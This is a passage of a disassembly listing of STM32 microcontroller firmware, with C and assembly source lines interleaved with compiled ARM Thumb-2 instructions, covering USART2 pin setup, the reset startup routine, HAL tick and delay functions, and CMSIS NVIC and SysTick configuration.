 80011fa:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 80011fc:	f003 0301 	and.w	r3, r3, #1
 8001200:	60bb      	str	r3, [r7, #8]
 8001202:	68bb      	ldr	r3, [r7, #8]
    /**USART2 GPIO Configuration
    PA2     ------> USART2_TX
    PA15 (JTDI)     ------> USART2_RX
    */
    GPIO_InitStruct.Pin = VCP_TX_Pin;
 8001204:	2304      	movs	r3, #4
 8001206:	667b      	str	r3, [r7, #100]	; 0x64
    GPIO_InitStruct.Mode = GPIO_MODE_AF_PP;
 8001208:	2302      	movs	r3, #2
 800120a:	66bb      	str	r3, [r7, #104]	; 0x68
    GPIO_InitStruct.Pull = GPIO_NOPULL;
 800120c:	2300      	movs	r3, #0
 800120e:	66fb      	str	r3, [r7, #108]	; 0x6c
    GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_VERY_HIGH;
 8001210:	2303      	movs	r3, #3
 8001212:	673b      	str	r3, [r7, #112]	; 0x70
    GPIO_InitStruct.Alternate = GPIO_AF7_USART2;
 8001214:	2307      	movs	r3, #7
 8001216:	677b      	str	r3, [r7, #116]	; 0x74
    HAL_GPIO_Init(VCP_TX_GPIO_Port, &GPIO_InitStruct);
 8001218:	f107 0364 	add.w	r3, r7, #100	; 0x64
 800121c:	4619      	mov	r1, r3
 800121e:	f04f 4090 	mov.w	r0, #1207959552	; 0x48000000
 8001222:	f000 fc67 	bl	8001af4 <HAL_GPIO_Init>

    GPIO_InitStruct.Pin = VCP_RX_Pin;
 8001226:	f44f 4300 	mov.w	r3, #32768	; 0x8000
 800122a:	667b      	str	r3, [r7, #100]	; 0x64
    GPIO_InitStruct.Mode = GPIO_MODE_AF_PP;
 800122c:	2302      	movs	r3, #2
 800122e:	66bb      	str	r3, [r7, #104]	; 0x68
    GPIO_InitStruct.Pull = GPIO_NOPULL;
 8001230:	2300      	movs	r3, #0
 8001232:	66fb      	str	r3, [r7, #108]	; 0x6c
    GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_VERY_HIGH;
 8001234:	2303      	movs	r3, #3
 8001236:	673b      	str	r3, [r7, #112]	; 0x70
    GPIO_InitStruct.Alternate = GPIO_AF3_USART2;
 8001238:	2303      	movs	r3, #3
 800123a:	677b      	str	r3, [r7, #116]	; 0x74
    HAL_GPIO_Init(VCP_RX_GPIO_Port, &GPIO_InitStruct);
 800123c:	f107 0364 	add.w	r3, r7, #100	; 0x64
 8001240:	4619      	mov	r1, r3
 8001242:	f04f 4090 	mov.w	r0, #1207959552	; 0x48000000
 8001246:	f000 fc55 	bl	8001af4 <HAL_GPIO_Init>

  /* USER CODE BEGIN USART2_MspInit 1 */

  /* USER CODE END USART2_MspInit 1 */
  }
}
 800124a:	bf00      	nop
 800124c:	3778      	adds	r7, #120	; 0x78
 800124e:	46bd      	mov	sp, r7
 8001250:	bd80      	pop	{r7, pc}
 8001252:	bf00      	nop
 8001254:	40004400 	.word	0x40004400
 8001258:	40021000 	.word	0x40021000

0800125c <Reset_Handler>:

    .section	.text.Reset_Handler
	.weak	Reset_Handler
	.type	Reset_Handler, %function
Reset_Handler:
  ldr   sp, =_estack    /* Set stack pointer */
 800125c:	f8df d034 	ldr.w	sp, [pc, #52]	; 8001294 <LoopForever+0x2>

/* Call the clock system initialization function.*/
    bl  SystemInit
 8001260:	f7ff fede 	bl	8001020 <SystemInit>

/* Copy the data segment initializers from flash to SRAM */
  ldr r0, =_sdata
 8001264:	480c      	ldr	r0, [pc, #48]	; (8001298 <LoopForever+0x6>)
  ldr r1, =_edata
 8001266:	490d      	ldr	r1, [pc, #52]	; (800129c <LoopForever+0xa>)
  ldr r2, =_sidata
 8001268:	4a0d      	ldr	r2, [pc, #52]	; (80012a0 <LoopForever+0xe>)
  movs r3, #0
 800126a:	2300      	movs	r3, #0
  b LoopCopyDataInit
 800126c:	e002      	b.n	8001274 <LoopCopyDataInit>

0800126e <CopyDataInit>:

CopyDataInit:
  ldr r4, [r2, r3]
 800126e:	58d4      	ldr	r4, [r2, r3]
  str r4, [r0, r3]
 8001270:	50c4      	str	r4, [r0, r3]
  adds r3, r3, #4
 8001272:	3304      	adds	r3, #4

08001274 <LoopCopyDataInit>:

LoopCopyDataInit:
  adds r4, r0, r3
 8001274:	18c4      	adds	r4, r0, r3
  cmp r4, r1
 8001276:	428c      	cmp	r4, r1
  bcc CopyDataInit
 8001278:	d3f9      	bcc.n	800126e <CopyDataInit>
  
/* Zero fill the bss segment. */
  ldr r2, =_sbss
 800127a:	4a0a      	ldr	r2, [pc, #40]	; (80012a4 <LoopForever+0x12>)
  ldr r4, =_ebss
 800127c:	4c0a      	ldr	r4, [pc, #40]	; (80012a8 <LoopForever+0x16>)
  movs r3, #0
 800127e:	2300      	movs	r3, #0
  b LoopFillZerobss
 8001280:	e001      	b.n	8001286 <LoopFillZerobss>

08001282 <FillZerobss>:

FillZerobss:
  str  r3, [r2]
 8001282:	6013      	str	r3, [r2, #0]
  adds r2, r2, #4
 8001284:	3204      	adds	r2, #4

08001286 <LoopFillZerobss>:

LoopFillZerobss:
  cmp r2, r4
 8001286:	42a2      	cmp	r2, r4
  bcc FillZerobss
 8001288:	d3fb      	bcc.n	8001282 <FillZerobss>

/* Call static constructors */
    bl __libc_init_array
 800128a:	f00b ff97 	bl	800d1bc <__libc_init_array>
/* Call the application's entry point.*/
	bl	main
 800128e:	f7ff f97b 	bl	8000588 <main>

08001292 <LoopForever>:

LoopForever:
    b LoopForever
 8001292:	e7fe      	b.n	8001292 <LoopForever>
  ldr   sp, =_estack    /* Set stack pointer */
 8001294:	20010000 	.word	0x20010000
  ldr r0, =_sdata
 8001298:	20000000 	.word	0x20000000
  ldr r1, =_edata
 800129c:	20000240 	.word	0x20000240
  ldr r2, =_sidata
 80012a0:	0800d47c 	.word	0x0800d47c
  ldr r2, =_sbss
 80012a4:	20000240 	.word	0x20000240
  ldr r4, =_ebss
 80012a8:	20001f14 	.word	0x20001f14

080012ac <ADC1_IRQHandler>:
 * @retval : None
*/
    .section	.text.Default_Handler,"ax",%progbits
Default_Handler:
Infinite_Loop:
	b	Infinite_Loop
 80012ac:	e7fe      	b.n	80012ac <ADC1_IRQHandler>

080012ae <HAL_Init>:
  *         each 1ms in the SysTick_Handler() interrupt handler.
  *
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_Init(void)
{
 80012ae:	b580      	push	{r7, lr}
 80012b0:	b082      	sub	sp, #8
 80012b2:	af00      	add	r7, sp, #0
  HAL_StatusTypeDef  status = HAL_OK;
 80012b4:	2300      	movs	r3, #0
 80012b6:	71fb      	strb	r3, [r7, #7]
#if (PREFETCH_ENABLE != 0)
  __HAL_FLASH_PREFETCH_BUFFER_ENABLE();
#endif /* PREFETCH_ENABLE */

  /* Set Interrupt Group Priority */
  HAL_NVIC_SetPriorityGrouping(NVIC_PRIORITYGROUP_4);
 80012b8:	2003      	movs	r0, #3
 80012ba:	f000 f961 	bl	8001580 <HAL_NVIC_SetPriorityGrouping>

  /* Use SysTick as time base source and configure 1ms tick (default clock after Reset is MSI) */
  if (HAL_InitTick(TICK_INT_PRIORITY) != HAL_OK)
 80012be:	2000      	movs	r0, #0
 80012c0:	f000 f80e 	bl	80012e0 <HAL_InitTick>
 80012c4:	4603      	mov	r3, r0
 80012c6:	2b00      	cmp	r3, #0
 80012c8:	d002      	beq.n	80012d0 <HAL_Init+0x22>
  {
    status = HAL_ERROR;
 80012ca:	2301      	movs	r3, #1
 80012cc:	71fb      	strb	r3, [r7, #7]
 80012ce:	e001      	b.n	80012d4 <HAL_Init+0x26>
  }
  else
  {
    /* Init the low level hardware */
    HAL_MspInit();
 80012d0:	f7ff fe44 	bl	8000f5c <HAL_MspInit>
  }

  /* Return function status */
  return status;
 80012d4:	79fb      	ldrb	r3, [r7, #7]
}
 80012d6:	4618      	mov	r0, r3
 80012d8:	3708      	adds	r7, #8
 80012da:	46bd      	mov	sp, r7
 80012dc:	bd80      	pop	{r7, pc}
	...

080012e0 <HAL_InitTick>:
  *       implementation  in user file.
  * @param TickPriority  Tick interrupt priority.
  * @retval HAL status
  */
__weak HAL_StatusTypeDef HAL_InitTick(uint32_t TickPriority)
{
 80012e0:	b580      	push	{r7, lr}
 80012e2:	b084      	sub	sp, #16
 80012e4:	af00      	add	r7, sp, #0
 80012e6:	6078      	str	r0, [r7, #4]
  HAL_StatusTypeDef  status = HAL_OK;
 80012e8:	2300      	movs	r3, #0
 80012ea:	73fb      	strb	r3, [r7, #15]

  /* Check uwTickFreq for MisraC 2012 (even if uwTickFreq is a enum type that doesn't take the value zero)*/
  if ((uint32_t)uwTickFreq != 0U)
 80012ec:	4b17      	ldr	r3, [pc, #92]	; (800134c <HAL_InitTick+0x6c>)
 80012ee:	781b      	ldrb	r3, [r3, #0]
 80012f0:	2b00      	cmp	r3, #0
 80012f2:	d023      	beq.n	800133c <HAL_InitTick+0x5c>
  {
    /*Configure the SysTick to have interrupt in 1ms time basis*/
    if (HAL_SYSTICK_Config(SystemCoreClock / (1000U / (uint32_t)uwTickFreq)) == 0U)
 80012f4:	4b16      	ldr	r3, [pc, #88]	; (8001350 <HAL_InitTick+0x70>)
 80012f6:	681a      	ldr	r2, [r3, #0]
 80012f8:	4b14      	ldr	r3, [pc, #80]	; (800134c <HAL_InitTick+0x6c>)
 80012fa:	781b      	ldrb	r3, [r3, #0]
 80012fc:	4619      	mov	r1, r3
 80012fe:	f44f 737a 	mov.w	r3, #1000	; 0x3e8
 8001302:	fbb3 f3f1 	udiv	r3, r3, r1
 8001306:	fbb2 f3f3 	udiv	r3, r2, r3
 800130a:	4618      	mov	r0, r3
 800130c:	f000 f96d 	bl	80015ea <HAL_SYSTICK_Config>
 8001310:	4603      	mov	r3, r0
 8001312:	2b00      	cmp	r3, #0
 8001314:	d10f      	bne.n	8001336 <HAL_InitTick+0x56>
    {
      /* Configure the SysTick IRQ priority */
      if (TickPriority < (1UL << __NVIC_PRIO_BITS))
 8001316:	687b      	ldr	r3, [r7, #4]
 8001318:	2b0f      	cmp	r3, #15
 800131a:	d809      	bhi.n	8001330 <HAL_InitTick+0x50>
      {
        HAL_NVIC_SetPriority(SysTick_IRQn, TickPriority, 0U);
 800131c:	2200      	movs	r2, #0
 800131e:	6879      	ldr	r1, [r7, #4]
 8001320:	f04f 30ff 	mov.w	r0, #4294967295
 8001324:	f000 f937 	bl	8001596 <HAL_NVIC_SetPriority>
        uwTickPrio = TickPriority;
 8001328:	4a0a      	ldr	r2, [pc, #40]	; (8001354 <HAL_InitTick+0x74>)
 800132a:	687b      	ldr	r3, [r7, #4]
 800132c:	6013      	str	r3, [r2, #0]
 800132e:	e007      	b.n	8001340 <HAL_InitTick+0x60>
      }
      else
      {
        status = HAL_ERROR;
 8001330:	2301      	movs	r3, #1
 8001332:	73fb      	strb	r3, [r7, #15]
 8001334:	e004      	b.n	8001340 <HAL_InitTick+0x60>
      }
    }
    else
    {
      status = HAL_ERROR;
 8001336:	2301      	movs	r3, #1
 8001338:	73fb      	strb	r3, [r7, #15]
 800133a:	e001      	b.n	8001340 <HAL_InitTick+0x60>
    }
  }
  else
  {
    status = HAL_ERROR;
 800133c:	2301      	movs	r3, #1
 800133e:	73fb      	strb	r3, [r7, #15]
  }

  /* Return function status */
  return status;
 8001340:	7bfb      	ldrb	r3, [r7, #15]
}
 8001342:	4618      	mov	r0, r3
 8001344:	3710      	adds	r7, #16
 8001346:	46bd      	mov	sp, r7
 8001348:	bd80      	pop	{r7, pc}
 800134a:	bf00      	nop
 800134c:	20000008 	.word	0x20000008
 8001350:	20000000 	.word	0x20000000
 8001354:	20000004 	.word	0x20000004

08001358 <HAL_IncTick>:
 * @note This function is declared as __weak to be overwritten in case of other
  *      implementations in user file.
  * @retval None
  */
__weak void HAL_IncTick(void)
{
 8001358:	b480      	push	{r7}
 800135a:	af00      	add	r7, sp, #0
  uwTick += (uint32_t)uwTickFreq;
 800135c:	4b06      	ldr	r3, [pc, #24]	; (8001378 <HAL_IncTick+0x20>)
 800135e:	781b      	ldrb	r3, [r3, #0]
 8001360:	461a      	mov	r2, r3
 8001362:	4b06      	ldr	r3, [pc, #24]	; (800137c <HAL_IncTick+0x24>)
 8001364:	681b      	ldr	r3, [r3, #0]
 8001366:	4413      	add	r3, r2
 8001368:	4a04      	ldr	r2, [pc, #16]	; (800137c <HAL_IncTick+0x24>)
 800136a:	6013      	str	r3, [r2, #0]
}
 800136c:	bf00      	nop
 800136e:	46bd      	mov	sp, r7
 8001370:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001374:	4770      	bx	lr
 8001376:	bf00      	nop
 8001378:	20000008 	.word	0x20000008
 800137c:	200003b8 	.word	0x200003b8

08001380 <HAL_GetTick>:
  * @note This function is declared as __weak to be overwritten in case of other
  *       implementations in user file.
  * @retval tick value
  */
__weak uint32_t HAL_GetTick(void)
{
 8001380:	b480      	push	{r7}
 8001382:	af00      	add	r7, sp, #0
  return uwTick;
 8001384:	4b03      	ldr	r3, [pc, #12]	; (8001394 <HAL_GetTick+0x14>)
 8001386:	681b      	ldr	r3, [r3, #0]
}
 8001388:	4618      	mov	r0, r3
 800138a:	46bd      	mov	sp, r7
 800138c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001390:	4770      	bx	lr
 8001392:	bf00      	nop
 8001394:	200003b8 	.word	0x200003b8

08001398 <HAL_Delay>:
  *       implementations in user file.
  * @param Delay  specifies the delay time length, in milliseconds.
  * @retval None
  */
__weak void HAL_Delay(uint32_t Delay)
{
 8001398:	b580      	push	{r7, lr}
 800139a:	b084      	sub	sp, #16
 800139c:	af00      	add	r7, sp, #0
 800139e:	6078      	str	r0, [r7, #4]
  uint32_t tickstart = HAL_GetTick();
 80013a0:	f7ff ffee 	bl	8001380 <HAL_GetTick>
 80013a4:	60b8      	str	r0, [r7, #8]
  uint32_t wait = Delay;
 80013a6:	687b      	ldr	r3, [r7, #4]
 80013a8:	60fb      	str	r3, [r7, #12]

  /* Add a period to guaranty minimum wait */
  if (wait < HAL_MAX_DELAY)
 80013aa:	68fb      	ldr	r3, [r7, #12]
 80013ac:	f1b3 3fff 	cmp.w	r3, #4294967295
 80013b0:	d005      	beq.n	80013be <HAL_Delay+0x26>
  {
    wait += (uint32_t)uwTickFreq;
 80013b2:	4b0a      	ldr	r3, [pc, #40]	; (80013dc <HAL_Delay+0x44>)
 80013b4:	781b      	ldrb	r3, [r3, #0]
 80013b6:	461a      	mov	r2, r3
 80013b8:	68fb      	ldr	r3, [r7, #12]
 80013ba:	4413      	add	r3, r2
 80013bc:	60fb      	str	r3, [r7, #12]
  }

  while ((HAL_GetTick() - tickstart) < wait)
 80013be:	bf00      	nop
 80013c0:	f7ff ffde 	bl	8001380 <HAL_GetTick>
 80013c4:	4602      	mov	r2, r0
 80013c6:	68bb      	ldr	r3, [r7, #8]
 80013c8:	1ad3      	subs	r3, r2, r3
 80013ca:	68fa      	ldr	r2, [r7, #12]
 80013cc:	429a      	cmp	r2, r3
 80013ce:	d8f7      	bhi.n	80013c0 <HAL_Delay+0x28>
  {
  }
}
 80013d0:	bf00      	nop
 80013d2:	bf00      	nop
 80013d4:	3710      	adds	r7, #16
 80013d6:	46bd      	mov	sp, r7
 80013d8:	bd80      	pop	{r7, pc}
 80013da:	bf00      	nop
 80013dc:	20000008 	.word	0x20000008

080013e0 <__NVIC_SetPriorityGrouping>:
           In case of a conflict between priority grouping and available
           priority bits (__NVIC_PRIO_BITS), the smallest possible priority group is set.
  \param [in]      PriorityGroup  Priority grouping field.
 */
__STATIC_INLINE void __NVIC_SetPriorityGrouping(uint32_t PriorityGroup)
{
 80013e0:	b480      	push	{r7}
 80013e2:	b085      	sub	sp, #20
 80013e4:	af00      	add	r7, sp, #0
 80013e6:	6078      	str	r0, [r7, #4]
  uint32_t reg_value;
  uint32_t PriorityGroupTmp = (PriorityGroup & (uint32_t)0x07UL);             /* only values 0..7 are used          */
 80013e8:	687b      	ldr	r3, [r7, #4]
 80013ea:	f003 0307 	and.w	r3, r3, #7
 80013ee:	60fb      	str	r3, [r7, #12]

  reg_value  =  SCB->AIRCR;                                                   /* read old register configuration    */
 80013f0:	4b0c      	ldr	r3, [pc, #48]	; (8001424 <__NVIC_SetPriorityGrouping+0x44>)
 80013f2:	68db      	ldr	r3, [r3, #12]
 80013f4:	60bb      	str	r3, [r7, #8]
  reg_value &= ~((uint32_t)(SCB_AIRCR_VECTKEY_Msk | SCB_AIRCR_PRIGROUP_Msk)); /* clear bits to change               */
 80013f6:	68ba      	ldr	r2, [r7, #8]
 80013f8:	f64f 03ff 	movw	r3, #63743	; 0xf8ff
 80013fc:	4013      	ands	r3, r2
 80013fe:	60bb      	str	r3, [r7, #8]
  reg_value  =  (reg_value                                   |
                ((uint32_t)0x5FAUL << SCB_AIRCR_VECTKEY_Pos) |
                (PriorityGroupTmp << SCB_AIRCR_PRIGROUP_Pos)  );              /* Insert write key and priority group */
 8001400:	68fb      	ldr	r3, [r7, #12]
 8001402:	021a      	lsls	r2, r3, #8
                ((uint32_t)0x5FAUL << SCB_AIRCR_VECTKEY_Pos) |
 8001404:	68bb      	ldr	r3, [r7, #8]
 8001406:	4313      	orrs	r3, r2
  reg_value  =  (reg_value                                   |
 8001408:	f043 63bf 	orr.w	r3, r3, #100139008	; 0x5f80000
 800140c:	f443 3300 	orr.w	r3, r3, #131072	; 0x20000
 8001410:	60bb      	str	r3, [r7, #8]
  SCB->AIRCR =  reg_value;
 8001412:	4a04      	ldr	r2, [pc, #16]	; (8001424 <__NVIC_SetPriorityGrouping+0x44>)
 8001414:	68bb      	ldr	r3, [r7, #8]
 8001416:	60d3      	str	r3, [r2, #12]
}
 8001418:	bf00      	nop
 800141a:	3714      	adds	r7, #20
 800141c:	46bd      	mov	sp, r7
 800141e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001422:	4770      	bx	lr
 8001424:	e000ed00 	.word	0xe000ed00

08001428 <__NVIC_GetPriorityGrouping>:
  \brief   Get Priority Grouping
  \details Reads the priority grouping field from the NVIC Interrupt Controller.
  \return                Priority grouping field (SCB->AIRCR [10:8] PRIGROUP field).
 */
__STATIC_INLINE uint32_t __NVIC_GetPriorityGrouping(void)
{
 8001428:	b480      	push	{r7}
 800142a:	af00      	add	r7, sp, #0
  return ((uint32_t)((SCB->AIRCR & SCB_AIRCR_PRIGROUP_Msk) >> SCB_AIRCR_PRIGROUP_Pos));
 800142c:	4b04      	ldr	r3, [pc, #16]	; (8001440 <__NVIC_GetPriorityGrouping+0x18>)
 800142e:	68db      	ldr	r3, [r3, #12]
 8001430:	0a1b      	lsrs	r3, r3, #8
 8001432:	f003 0307 	and.w	r3, r3, #7
}
 8001436:	4618      	mov	r0, r3
 8001438:	46bd      	mov	sp, r7
 800143a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800143e:	4770      	bx	lr
 8001440:	e000ed00 	.word	0xe000ed00

08001444 <__NVIC_EnableIRQ>:
  \details Enables a device specific interrupt in the NVIC interrupt controller.
  \param [in]      IRQn  Device specific interrupt number.
  \note    IRQn must not be negative.
 */
__STATIC_INLINE void __NVIC_EnableIRQ(IRQn_Type IRQn)
{
 8001444:	b480      	push	{r7}
 8001446:	b083      	sub	sp, #12
 8001448:	af00      	add	r7, sp, #0
 800144a:	4603      	mov	r3, r0
 800144c:	71fb      	strb	r3, [r7, #7]
  if ((int32_t)(IRQn) >= 0)
 800144e:	f997 3007 	ldrsb.w	r3, [r7, #7]
 8001452:	2b00      	cmp	r3, #0
 8001454:	db0b      	blt.n	800146e <__NVIC_EnableIRQ+0x2a>
  {
    __COMPILER_BARRIER();
    NVIC->ISER[(((uint32_t)IRQn) >> 5UL)] = (uint32_t)(1UL << (((uint32_t)IRQn) & 0x1FUL));
 8001456:	79fb      	ldrb	r3, [r7, #7]
 8001458:	f003 021f 	and.w	r2, r3, #31
 800145c:	4907      	ldr	r1, [pc, #28]	; (800147c <__NVIC_EnableIRQ+0x38>)
 800145e:	f997 3007 	ldrsb.w	r3, [r7, #7]
 8001462:	095b      	lsrs	r3, r3, #5
 8001464:	2001      	movs	r0, #1
 8001466:	fa00 f202 	lsl.w	r2, r0, r2
 800146a:	f841 2023 	str.w	r2, [r1, r3, lsl #2]
    __COMPILER_BARRIER();
  }
}
 800146e:	bf00      	nop
 8001470:	370c      	adds	r7, #12
 8001472:	46bd      	mov	sp, r7
 8001474:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001478:	4770      	bx	lr
 800147a:	bf00      	nop
 800147c:	e000e100 	.word	0xe000e100

08001480 <__NVIC_SetPriority>:
  \param [in]      IRQn  Interrupt number.
  \param [in]  priority  Priority to set.
  \note    The priority cannot be set for every processor exception.
 */
__STATIC_INLINE void __NVIC_SetPriority(IRQn_Type IRQn, uint32_t priority)
{
 8001480:	b480      	push	{r7}
 8001482:	b083      	sub	sp, #12
 8001484:	af00      	add	r7, sp, #0
 8001486:	4603      	mov	r3, r0
 8001488:	6039      	str	r1, [r7, #0]
 800148a:	71fb      	strb	r3, [r7, #7]
  if ((int32_t)(IRQn) >= 0)
 800148c:	f997 3007 	ldrsb.w	r3, [r7, #7]
 8001490:	2b00      	cmp	r3, #0
 8001492:	db0a      	blt.n	80014aa <__NVIC_SetPriority+0x2a>
  {
    NVIC->IP[((uint32_t)IRQn)]               = (uint8_t)((priority << (8U - __NVIC_PRIO_BITS)) & (uint32_t)0xFFUL);
 8001494:	683b      	ldr	r3, [r7, #0]
 8001496:	b2da      	uxtb	r2, r3
 8001498:	490c      	ldr	r1, [pc, #48]	; (80014cc <__NVIC_SetPriority+0x4c>)
 800149a:	f997 3007 	ldrsb.w	r3, [r7, #7]
 800149e:	0112      	lsls	r2, r2, #4
 80014a0:	b2d2      	uxtb	r2, r2
 80014a2:	440b      	add	r3, r1
 80014a4:	f883 2300 	strb.w	r2, [r3, #768]	; 0x300
  }
  else
  {
    SCB->SHP[(((uint32_t)IRQn) & 0xFUL)-4UL] = (uint8_t)((priority << (8U - __NVIC_PRIO_BITS)) & (uint32_t)0xFFUL);
  }
}
 80014a8:	e00a      	b.n	80014c0 <__NVIC_SetPriority+0x40>
    SCB->SHP[(((uint32_t)IRQn) & 0xFUL)-4UL] = (uint8_t)((priority << (8U - __NVIC_PRIO_BITS)) & (uint32_t)0xFFUL);
 80014aa:	683b      	ldr	r3, [r7, #0]
 80014ac:	b2da      	uxtb	r2, r3
 80014ae:	4908      	ldr	r1, [pc, #32]	; (80014d0 <__NVIC_SetPriority+0x50>)
 80014b0:	79fb      	ldrb	r3, [r7, #7]
 80014b2:	f003 030f 	and.w	r3, r3, #15
 80014b6:	3b04      	subs	r3, #4
 80014b8:	0112      	lsls	r2, r2, #4
 80014ba:	b2d2      	uxtb	r2, r2
 80014bc:	440b      	add	r3, r1
 80014be:	761a      	strb	r2, [r3, #24]
}
 80014c0:	bf00      	nop
 80014c2:	370c      	adds	r7, #12
 80014c4:	46bd      	mov	sp, r7
 80014c6:	f85d 7b04 	ldr.w	r7, [sp], #4
 80014ca:	4770      	bx	lr
 80014cc:	e000e100 	.word	0xe000e100
 80014d0:	e000ed00 	.word	0xe000ed00

080014d4 <NVIC_EncodePriority>:
  \param [in]   PreemptPriority  Preemptive priority value (starting from 0).
  \param [in]       SubPriority  Subpriority value (starting from 0).
  \return                        Encoded priority. Value can be used in the function \ref NVIC_SetPriority().
 */
__STATIC_INLINE uint32_t NVIC_EncodePriority (uint32_t PriorityGroup, uint32_t PreemptPriority, uint32_t SubPriority)
{
 80014d4:	b480      	push	{r7}
 80014d6:	b089      	sub	sp, #36	; 0x24
 80014d8:	af00      	add	r7, sp, #0
 80014da:	60f8      	str	r0, [r7, #12]
 80014dc:	60b9      	str	r1, [r7, #8]
 80014de:	607a      	str	r2, [r7, #4]
  uint32_t PriorityGroupTmp = (PriorityGroup & (uint32_t)0x07UL);   /* only values 0..7 are used          */
 80014e0:	68fb      	ldr	r3, [r7, #12]
 80014e2:	f003 0307 	and.w	r3, r3, #7
 80014e6:	61fb      	str	r3, [r7, #28]
  uint32_t PreemptPriorityBits;
  uint32_t SubPriorityBits;

  PreemptPriorityBits = ((7UL - PriorityGroupTmp) > (uint32_t)(__NVIC_PRIO_BITS)) ? (uint32_t)(__NVIC_PRIO_BITS) : (uint32_t)(7UL - PriorityGroupTmp);
 80014e8:	69fb      	ldr	r3, [r7, #28]
 80014ea:	f1c3 0307 	rsb	r3, r3, #7
 80014ee:	2b04      	cmp	r3, #4
 80014f0:	bf28      	it	cs
 80014f2:	2304      	movcs	r3, #4
 80014f4:	61bb      	str	r3, [r7, #24]
  SubPriorityBits     = ((PriorityGroupTmp + (uint32_t)(__NVIC_PRIO_BITS)) < (uint32_t)7UL) ? (uint32_t)0UL : (uint32_t)((PriorityGroupTmp - 7UL) + (uint32_t)(__NVIC_PRIO_BITS));
 80014f6:	69fb      	ldr	r3, [r7, #28]
 80014f8:	3304      	adds	r3, #4
 80014fa:	2b06      	cmp	r3, #6
 80014fc:	d902      	bls.n	8001504 <NVIC_EncodePriority+0x30>
 80014fe:	69fb      	ldr	r3, [r7, #28]
 8001500:	3b03      	subs	r3, #3
 8001502:	e000      	b.n	8001506 <NVIC_EncodePriority+0x32>
 8001504:	2300      	movs	r3, #0
 8001506:	617b      	str	r3, [r7, #20]

  return (
           ((PreemptPriority & (uint32_t)((1UL << (PreemptPriorityBits)) - 1UL)) << SubPriorityBits) |
 8001508:	f04f 32ff 	mov.w	r2, #4294967295
 800150c:	69bb      	ldr	r3, [r7, #24]
 800150e:	fa02 f303 	lsl.w	r3, r2, r3
 8001512:	43da      	mvns	r2, r3
 8001514:	68bb      	ldr	r3, [r7, #8]
 8001516:	401a      	ands	r2, r3
 8001518:	697b      	ldr	r3, [r7, #20]
 800151a:	409a      	lsls	r2, r3
           ((SubPriority     & (uint32_t)((1UL << (SubPriorityBits    )) - 1UL)))
 800151c:	f04f 31ff 	mov.w	r1, #4294967295
 8001520:	697b      	ldr	r3, [r7, #20]
 8001522:	fa01 f303 	lsl.w	r3, r1, r3
 8001526:	43d9      	mvns	r1, r3
 8001528:	687b      	ldr	r3, [r7, #4]
 800152a:	400b      	ands	r3, r1
           ((PreemptPriority & (uint32_t)((1UL << (PreemptPriorityBits)) - 1UL)) << SubPriorityBits) |
 800152c:	4313      	orrs	r3, r2
         );
}
 800152e:	4618      	mov	r0, r3
 8001530:	3724      	adds	r7, #36	; 0x24
 8001532:	46bd      	mov	sp, r7
 8001534:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001538:	4770      	bx	lr
	...

0800153c <SysTick_Config>:
  \note    When the variable <b>__Vendor_SysTickConfig</b> is set to 1, then the
           function <b>SysTick_Config</b> is not included. In this case, the file <b><i>device</i>.h</b>
           must contain a vendor-specific implementation of this function.
 */
__STATIC_INLINE uint32_t SysTick_Config(uint32_t ticks)
{
 800153c:	b580      	push	{r7, lr}
 800153e:	b082      	sub	sp, #8
 8001540:	af00      	add	r7, sp, #0
 8001542:	6078      	str	r0, [r7, #4]
  if ((ticks - 1UL) > SysTick_LOAD_RELOAD_Msk)
 8001544:	687b      	ldr	r3, [r7, #4]
 8001546:	3b01      	subs	r3, #1
 8001548:	f1b3 7f80 	cmp.w	r3, #16777216	; 0x1000000
 800154c:	d301      	bcc.n	8001552 <SysTick_Config+0x16>
  {
    return (1UL);                                                   /* Reload value impossible */
 800154e:	2301      	movs	r3, #1
 8001550:	e00f      	b.n	8001572 <SysTick_Config+0x36>
  }

  SysTick->LOAD  = (uint32_t)(ticks - 1UL);                         /* set reload register */
 8001552:	4a0a      	ldr	r2, [pc, #40]	; (800157c <SysTick_Config+0x40>)
 8001554:	687b      	ldr	r3, [r7, #4]
 8001556:	3b01      	subs	r3, #1
 8001558:	6053      	str	r3, [r2, #4]
  NVIC_SetPriority (SysTick_IRQn, (1UL << __NVIC_PRIO_BITS) - 1UL); /* set Priority for Systick Interrupt */
 800155a:	210f      	movs	r1, #15
 800155c:	f04f 30ff 	mov.w	r0, #4294967295
 8001560:	f7ff ff8e 	bl	8001480 <__NVIC_SetPriority>
  SysTick->VAL   = 0UL;                                             /* Load the SysTick Counter Value */
 8001564:	4b05      	ldr	r3, [pc, #20]	; (800157c <SysTick_Config+0x40>)
 8001566:	2200      	movs	r2, #0
 8001568:	609a      	str	r2, [r3, #8]
  SysTick->CTRL  = SysTick_CTRL_CLKSOURCE_Msk |
 800156a:	4b04      	ldr	r3, [pc, #16]	; (800157c <SysTick_Config+0x40>)
 800156c:	2207      	movs	r2, #7
 800156e:	601a      	str	r2, [r3, #0]
                   SysTick_CTRL_TICKINT_Msk   |
                   SysTick_CTRL_ENABLE_Msk;                         /* Enable SysTick IRQ and SysTick Timer */
  return (0UL);                                                     /* Function successful */
 8001570:	2300      	movs	r3, #0
}
 8001572:	4618      	mov	r0, r3
 8001574:	3708      	adds	r7, #8
 8001576:	46bd      	mov	sp, r7
 8001578:	bd80      	pop	{r7, pc}
 800157a:	bf00      	nop
 800157c:	e000e010 	.word	0xe000e010

08001580 <HAL_NVIC_SetPriorityGrouping>:
  * @note   When the NVIC_PriorityGroup_0 is selected, IRQ pre-emption is no more possible.
  *         The pending IRQ priority will be managed only by the subpriority.
  * @retval None
  */
void HAL_NVIC_SetPriorityGrouping(uint32_t PriorityGroup)
{
 8001580:	b580      	push	{r7, lr}
 8001582:	b082      	sub	sp, #8
 8001584:	af00      	add	r7, sp, #0
 8001586:	6078      	str	r0, [r7, #4]
  /* Check the parameters */
  assert_param(IS_NVIC_PRIORITY_GROUP(PriorityGroup));

  /* Set the PRIGROUP[10:8] bits according to the PriorityGroup parameter value */
  NVIC_SetPriorityGrouping(PriorityGroup);
 8001588:	6878      	ldr	r0, [r7, #4]
